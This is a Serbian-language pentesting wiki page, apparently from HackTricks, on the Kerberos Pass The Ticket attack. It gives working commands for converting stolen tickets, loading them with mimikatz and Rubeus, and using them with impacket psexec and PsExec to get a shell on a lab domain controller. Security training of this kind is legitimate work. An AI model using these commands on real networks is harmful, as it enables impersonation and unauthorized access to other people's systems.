# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Pass The Ticket (PTT)

U metodi napada **Pass The Ticket (PTT)**, napadači **kradu korisnički autentifikacioni tiket** umesto njihove lozinke ili heš vrednosti. Ovaj ukradeni tiket se zatim koristi za **impostaciju korisnika**, stičući neovlašćen pristup resursima i uslugama unutar mreže.

**Pročitajte**:

- [Berba tiketa sa Windows-a](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Berba tiketa sa Linux-a](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

### **Razmena Linux i Windows tiketa između platformi**

Alat [**ticket_converter**](https://github.com/Zer1t0/ticket_converter) konvertuje formate tiketa koristeći samo tiket i izlaznu datoteku.
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi

python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```
U Windows-u [Kekeo](https://github.com/gentilkiwi/kekeo) može se koristiti.

### Pass The Ticket Attack
```bash:Linux
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

```bash:Windows
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist #List tickets in cache to cehck that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
## Reference

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#include ../../banners/hacktricks-training.md}}
